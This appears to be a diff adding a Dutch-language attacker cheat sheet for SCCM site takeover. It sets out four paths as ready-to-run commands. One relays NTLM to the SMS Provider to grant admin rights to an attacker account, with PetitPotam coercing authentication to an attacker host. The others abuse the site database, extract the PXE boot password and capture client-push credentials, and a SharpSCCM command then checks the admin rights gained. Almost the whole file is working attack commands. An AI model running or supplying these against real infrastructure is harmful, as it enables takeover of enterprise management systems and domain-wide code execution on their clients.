@@ -1,0 +1,33 @@
+# SCCM Site Takeover — Volledige controle over SCCM infrastructuur
+# Meerdere paden naar SCCM site takeover, afhankelijk van toegang
+#
+# === Vereisten ===
+# - Afhankelijk van methode (zie per pad)
+#
+# === Voorbeelden ===
+
+# === Pad 1: Via NTLM relay naar SMS Provider ===
+# Coerce DC of site server → relay naar SMS Provider HTTP endpoint
+# Terminal 1:
+python3 ntlmrelayx.py -t http://SCCM_SERVER/AdminService/wmi/SMS_Admin -smb2support --sccm --sccm-admin ATTACKER_USER --sccm-site SITECODE
+# Terminal 2:
+python3 PetitPotam.py -u USER -p 'PASS' -d DOMAIN ATTACKER_IP SCCM_SERVER
+
+# === Pad 2: Via MSSQL (site database) ===
+# Als je toegang hebt tot de SCCM SQL database
+python3 sccmhunter.py mssql -u SA -p 'DBPASS' -d DOMAIN -dc-ip DC_IP -target SCCM_DB
+
+# === Pad 3: Via PXE boot wachtwoord ===
+python3 pxethief.py 2 SCCM_PXE_SERVER
+
+# === Pad 4: Via client push installation ===
+# SCCM push installeert client software met hoge privileges
+# Als je een machine account controleert, kun je push credentials vangen
+python3 sccmhunter.py show -u USER -p 'PASS' -d DOMAIN -dc-ip DC_IP
+
+# Verifieer SCCM admin rechten
+.\SharpSCCM.exe get admins -sms SMS_SERVER -sc SITECODE
+
+# Noot: SCCM site servers hebben vaak SYSTEM-level toegang op alle clients
+# Noot: SMS Provider is het centrale management punt
+# Noot: SCCM compromittering = potentieel domain-wide code execution
